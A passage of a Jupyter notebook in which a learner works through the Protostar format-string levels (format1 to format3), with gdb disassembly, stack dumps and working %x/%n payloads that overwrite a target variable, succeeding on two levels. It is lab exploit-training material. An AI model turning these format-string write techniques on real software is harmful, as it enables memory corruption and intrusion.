    "    (gdb) run \"AAAA%n\"\n",
    "    (gdb) x/x $esp\n",
    "    0xbffff750:\t0xbffff973\n",
    "    (gdb) x/x 0xbffff973\n",
    "    0xbffff973:\t0x41414141\n",
    "    (gdb) x/x $esp+4\n",
    "    0xbffff754:\t0xbffff76c\n",
    "    (gdb) x/x 0xbffff76c\n",
    "    0xbffff76c:\t0x00000004"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "esp contains the address of the provided user input\n",
    "esp+4 points to the address where %n is written to"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Testing %x \n",
    "<pre>\n",
    "    %x pops a memory address from the stack which means the following address will point to \n",
    "    the location where %n writes to.\n",
    "    \"AAAA%n\" writes to esp+4\n",
    "    \"AAAA%x%n\" writes to esp+8\n",
    "    \"AAAA%x%x%n\" writes to esp+12\n",
    "    ...\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Solving Format1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    (gdb) disas main\n",
    "    0x0804841c < main+0 >:    push   %ebp\n",
    "    0x0804841d < main+1 >:    mov    %esp,%ebp\n",
    "    0x0804841f < main+3 >:    and    $0xfffffff0,%esp\n",
    "    0x08048422 < main+6 >:    sub    $0x10,%esp\n",
    "    0x08048425 < main+9 >:    mov    0xc(%ebp),%eax\n",
    "    0x08048428 < main+12 >:   add    $0x4,%eax\n",
    "    0x0804842b < main+15 >:   mov    (%eax),%eax\n",
    "    0x0804842d < main+17 >:   mov    %eax,(%esp)\n",
    "    0x08048430 < main+20 >:   call   0x80483f4 <vuln>\n",
    "    0x08048435 < main+25 >:   leave  \n",
    "    0x08048436 < main+26 >:   ret "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    (gdb) disas vuln\n",
    "    0x080483f4 < vuln+0 >:    push   %ebp\n",
    "    0x080483f5 < vuln+1 >:    mov    %esp,%ebp\n",
    "    0x080483f7 < vuln+3 >:    sub    $0x18,%esp\n",
    "    0x080483fa < vuln+6 >:    mov    0x8(%ebp),%eax\n",
    "    0x080483fd < vuln+9 >:    mov    %eax,(%esp)\n",
    "    0x08048400 < vuln+12 >:   call   0x8048320 <printf@plt>\n",
    "    0x08048405 < vuln+17 >:   mov    0x8049638,%eax\n",
    "    0x0804840a < vuln+22 >:   test   %eax,%eax\n",
    "    0x0804840c < vuln+24 >:   je     0x804841a <vuln+38>\n",
    "    0x0804840e < vuln+26 >:   movl   $0x8048500,(%esp)\n",
    "    0x08048415 < vuln+33 >:   call   0x8048330 <puts@plt>\n",
    "    0x0804841a < vuln+38 >:   leave  \n",
    "    0x0804841b < vuln+39 >:   ret "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "we have to set 0x8049638!=0\n",
    "Unfortunately format 1 does not have a second printf statement or a fflush which means the provided string is stored in the buffer until the program finishes. This means %x is not executed until the program stops executing which hinders the usage of gdb.\n",
    "With ./format1 \"%x.%x\" we can print the stack without gdb"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "/opt/protostar/bin$ ./format1 `python -c 'print \"%x.\"*200'`\n",
    "<pre>\n",
    "    804960c.bffff598.8048469.b7fd8304.b7fd7ff4.bffff598.8048435.bffff75b.b7ff1040.\n",
    "    804845b.b7fd7ff4.8048450.0.bffff618.b7eadc76.2.bffff644.bffff650.b7fe1848.\n",
    "    bffff600.ffffffff.b7ffeff4.804824d.1.bffff600.b7ff0626.b7fffab0.b7fe1b28.\n",
    "    b7fd7ff4.0.0.bffff618.57e4bf3.2f2d7de3.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.\n",
    "    b7ffeff4.2.8048340.0.8048361.804841c.2.bffff644.8048450.8048440.b7ff1040.bffff63c.\n",
    "    b7fff8f8.2.bffff751.bffff75b.0.bffff9b4.bffff9c2.bffff9d6.bffff9f6.bffffa09.\n",
    "    bffffa13.bfffff03.bfffff41.bfffff55.bfffff6c.bfffff7d.bfffff85.bfffff95.bfffffa2.\n",
    "    bfffffd4.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.\n",
    "    b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff73b.1f.bffffff2.f.bffff74b.0.0.0.\n",
    "    7f000000.854861e7.d467d4a.93328c49.69f50e74.363836.662f2e00.616d726f.25003174.78252e78.\n",
    "    2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.\n",
    "    252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.\n",
    "    78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.\n",
    "    2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.\n",
    "    252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.\n",
    "    78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e7825"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "the first addresses look like our usual stack addresses but the end looks kind of strange."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'x%.x'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bytes.fromhex('78252e78').decode('utf-8')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Nice, our provided input like in our buffer overflows gets placed on the stack\n",
    "./format1 `python -c 'print \"AAAAAAAA\"+\"%x.\"*130'`\n",
    "<pre>\n",
    "    AAAAAAAA804960c.bffff658.8048469.b7fd8304.b7fd7ff4.bffff658.8048435.bffff825.b7ff1040.804845b.b7fd7ff4.\n",
    "    8048450.0.bffff6d8.b7eadc76.2.bffff704.bffff710.b7fe1848.bffff6c0.ffffffff.b7ffeff4.804824d.1.bffff6c0.\n",
    "    b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6d8.2ff596a6.5a120b6.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.\n",
    "    b7ffeff4.2.8048340.0.8048361.804841c.2.bffff704.8048450.8048440.b7ff1040.bffff6fc.b7fff8f8.2.bffff81b.\n",
    "    bffff825.0.bffff9b4.bffff9c2.bffff9d6.bffff9f6.bffffa09.bffffa13.bfffff03.bfffff41.bfffff55.bfffff6c.\n",
    "    bfffff7d.bfffff85.bfffff95.bfffffa2.bfffffd4.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.\n",
    "    64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7fb.1f.bffffff2.f.\n",
    "    bffff80b.0.0.0.8e000000.ab81b759.deece80c.c8d1894d.694b6547.363836.0.0.2e000000.726f662f.3174616d.\n",
    "    41414100.41414141"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "so roughly after poping 130 elements of the stack we get to the memory area where our provided input is stored. <br>\n",
    "***Idea:*** <br>\n",
    "write the address 0x8049638 (see assembly above) on the stack, and pop elements until it is at %esp+4 so %n will write to this address. This manipulates <br>\n",
    "0x08048405 < vuln+17 >:   mov    0x8049638,%eax  <br>\n",
    "0x0804840a < vuln+22 >:   test   %eax,%eax  <br>\n",
    "because of little endian we the address becomes: \"\\x38\\x96\\x04\\x08\" <br> \n",
    "after some trying around with roughly 130*\"%x% we come to the right number of stack pop operations\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "./format1 `python -c 'print \"\\x38\\x96\\x04\\x08\" * 50 + \"%x.\"*126 + \"%n\" '`\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "user@protostar:/opt/protostar/bin$ ./format1 `python -c 'print \"\\x38\\x96\\x04\\x08\" * 50 + \"%x.\"*129 + \"%n\" '`\n",
    "8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�804960c.bffff588.8048469.b7fd8304.b7fd7ff4.bffff588.8048435.bffff758.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff608.b7eadc76.2.bffff634.bffff640.b7fe1848.bffff5f0.ffffffff.b7ffeff4.804824d.1.bffff5f0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff608.f222585f.d8710e4f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff634.8048450.8048440.b7ff1040.bffff62c.b7fff8f8.2.bffff74e.bffff758.0.bffff9a6.bffff9b4.bffff9c8.bffff9e8.bffff9fb.bffffa05.bffffef5.bfffff33.bfffff47.bfffff5e.bfffff6f.bfffff77.bfffff87.bfffff94.bfffffc6.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff72b.1f.bffffff2.f.bffff73b.0.0.0.f7000000.bcebfbc0.b39006e4.d05f9f4f.69f7fc8d.363836.0.0.0.2f2e0000.6d726f66.317461.you have modified the target :)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Format2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    ./format2\n",
    "    AAAAA\n",
    "    AAAAA"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    (gdb) disas main\n",
    "    0x080484bb < main+0 >:   push   %ebp\n",
    "    0x080484bc < main+1 >:   mov    %esp,%ebp\n",
    "    0x080484be < main+3 >:   and    $0xfffffff0,%esp\n",
    "    0x080484c1 < main+6 >:   call   0x8048454 < vuln >\n",
    "    0x080484c6 < main+11 >:  mov    %ebp,%esp\n",
    "    0x080484c8 < main+13 >:  pop    %ebp\n",
    "    0x080484c9 < main+14 >:  ret "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    (gdb) disas vuln\n",
    "    0x08048454 < vuln+0 >:      push   %ebp\n",
    "    0x08048455 < vuln+1 >:      mov    %esp,%ebp\n",
    "    0x08048457 < vuln+3 >:      sub    $0x218,%esp\n",
    "    0x0804845d < vuln+9 >:      mov    0x80496d8,%eax\n",
    "    0x08048462 < vuln+14 >:     mov    %eax,0x8(%esp)\n",
    "    0x08048466 < vuln+18 >:     movl   $0x200,0x4(%esp)\n",
    "    0x0804846e < vuln+26 >:     lea    -0x208(%ebp),%eax\n",
    "    0x08048474 < vuln+32 >:     mov    %eax,(%esp)\n",
    "    0x08048477 < vuln+35 >:     call   0x804835c < fgets@plt >\n",
    "    0x0804847c < vuln+40 >:     lea    -0x208(%ebp),%eax\n",
    "    0x08048482 < vuln+46 >:     mov    %eax,(%esp)\n",
    "    0x08048485 < vuln+49 >:     call   0x804837c < printf@plt >\n",
    "    0x0804848a < vuln+54 >:     mov    0x80496e4,%eax\n",
    "    0x0804848f < vuln+59 >:     cmp    $0x40,%eax\n",
    "    0x08048492 < vuln+62 >:     jne    0x80484a2 < vuln+78 >\n",
    "    0x08048494 < vuln+64 >:     movl   $0x8048590,(%esp)\n",
    "    0x0804849b < vuln+71 >:     call   0x804838c < puts@plt >\n",
    "    0x080484a0 < vuln+76 >:     jmp    0x80484b9 < vuln+101 > \n",
    "    0x080484a2 < vuln+78 >:     mov    0x80496e4,%edx\n",
    "    0x080484a8 < vuln+84 >:     mov    $0x80485b0,%eax\n",
    "    0x080484ad < vuln+89 >:     mov    %edx,0x4(%esp)\n",
    "    0x080484b1 < vuln+93 >:     mov    %eax,(%esp)\n",
    "    0x080484b4 < vuln+96 >:     call   0x804837c < printf@plt >\n",
    "    0x080484b9 < vuln+101 >:    leave  \n",
    "    0x080484ba < vuln+102 >:    ret "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "-0x208(%ebp) contains the input\n",
    "x/x $ebp-0x208\n",
    "0xbffff5a0:\t0x41414141\n",
    "\n",
    "(gdb) x/s 0x8048590\n",
    "0x8048590:\t \"you have modified the target :)\"\n",
    "\n",
    "0x0804848a < vuln+54 >:     mov    0x80496e4,%eax\n",
    "0x0804848f < vuln+59 >:     cmp    $0x40,%eax\n",
    "--> we want a 0x40 in 0x80496e4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'%x.%x.%x.%x.'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "./format2\n",
    "\"AAABBBBB%x.%x.%x.%x.%x\"\n",
    "\"AAABBBBB200.b7fd8420.bffff614.41414122.42424242\"\n",
    "3 A's for padding followed by the address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "python -c 'print \"AAAA\\xe4\\x96\\x04\\x08%x.%x.%x.%x.%n\"' > /home/user/format2\n",
    "(gdb) run < /home/user/format2\n",
    "writes a 39 into eax so we need some more chars before the %n\n",
    "python -c 'print \"AAAA\\xe4\\x96\\x04\\x08%x.%x.%x.%x.BBBBBBBBBBBBBBBBBBBBBBBBB%n\"' > /home/user/format2\n",
    "you have modified the target :)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Format3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    ./format3\n",
    "    abc\n",
    "    abc\n",
    "    target is 00000000 :("
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    0x080484d0 < main+0 >:    push   %ebp\n",
    "    0x080484d1 < main+1 >:    mov    %esp,%ebp\n",
    "    0x080484d3 < main+3 >:    and    $0xfffffff0,%esp\n",
    "    0x080484d6 < main+6 >:    call   0x8048467 < vuln >\n",
    "    0x080484db < main+11 >:   mov    %ebp,%esp\n",
    "    0x080484dd < main+13 >:   pop    %ebp\n",
    "    0x080484de < main+14 >:   ret"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    0x08048467 < vuln+0 >:     push   %ebp\n",
    "    0x08048468 < vuln+1 >:     mov    %esp,%ebp\n",
    "    0x0804846a < vuln+3 >:     sub    $0x218,%esp\n",
    "    0x08048470 < vuln+9 >:     mov    0x80496e8,%eax\n",
    "    0x08048475 < vuln+14 >:    mov    %eax,0x8(%esp)\n",
    "    0x08048479 < vuln+18 >:    movl   $0x200,0x4(%esp)\n",
    "    0x08048481 < vuln+26 >:    lea    -0x208(%ebp),%eax\n",
    "    0x08048487 < vuln+32 >:    mov    %eax,(%esp)\n",
    "    0x0804848a < vuln+35 >:    call   0x804835c < fgets@plt >\n",
    "    0x0804848f < vuln+40 >:    lea    -0x208(%ebp),%eax\n",
    "    0x08048495 < vuln+46 >:    mov    %eax,(%esp)\n",
    "    0x08048498 < vuln+49 >:    call   0x8048454 < printbuffer >\n",
    "    0x0804849d < vuln+54 >:    mov    0x80496f4,%eax\n",
    "    0x080484a2 < vuln+59 >:    cmp    $0x1025544,%eax\n",
    "    0x080484a7 < vuln+64 >:    jne    0x80484b7 < vuln+80 >\n",
    "    0x080484a9 < vuln+66 >:    movl   $0x80485a0,(%esp)\n",
    "    0x080484b0 < vuln+73 >:    call   0x804838c < puts@plt >\n",
    "    0x080484b5 < vuln+78 >:    jmp    0x80484ce < vuln+103 >\n",
    "    0x080484b7 < vuln+80 >:    mov    0x80496f4,%edx\n",
    "    0x080484bd < vuln+86 >:    mov    $0x80485c0,%eax\n",
    "    0x080484c2 < vuln+91 >:    mov    %edx,0x4(%esp)\n",
    "    0x080484c6 < vuln+95 >:    mov    %eax,(%esp)\n",
    "    0x080484c9 < vuln+98 >:    call   0x804837c < printf@plt >\n",
    "    0x080484ce < vuln+103 >:   leave  \n",
    "    0x080484cf < vuln+104 >:   ret "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    (gdb) disas printbuffer\n",
    "    Dump of assembler code for function printbuffer:\n",
    "    0x08048454 < printbuffer+0 >:    push   %ebp\n",
    "    0x08048455 < printbuffer+1 >:    mov    %esp,%ebp\n",
    "    0x08048457 < printbuffer+3 >:    sub    $0x18,%esp\n",
    "    0x0804845a < printbuffer+6 >:    mov    0x8(%ebp),%eax\n",
    "    0x0804845d < printbuffer+9 >:    mov    %eax,(%esp)\n",
    "    0x08048460 < printbuffer+12 >:   call   0x804837c <printf@plt>\n",
    "    0x08048465 < printbuffer+17 >:   leave  \n",
    "    0x08048466 < printbuffer+18 >:   ret "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "<pre>\n",
    "    run \"AAAA\"\n",
    "    0x804835c = AAAA\n",
    "    0x80496f4 = target variable which has to be set to $0x01025544\n",
    "    (gdb) x/s 0x80485a0\n",
    "    0x80485a0:\t \"you have modified the target :)\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.\n"
     ]
    }
   ],
   "source": [
    "print('AAAA' + 20*'%x.')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "./format3\n",
    "AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.\n",
    "AAAA0.bffff5d0.b7fd7ff4.0.0.\n",
    "bffff7d8.804849d.bffff5d0.200.b7fd8420.\n",
    "bffff614.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "we can write arbitrary numbers at some stack location but 0x1025544 is to big to use a string with so many chars. Can we use multiple %n's to write at the different byte locations? e.g. write a 01 followed by  02 55 44"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
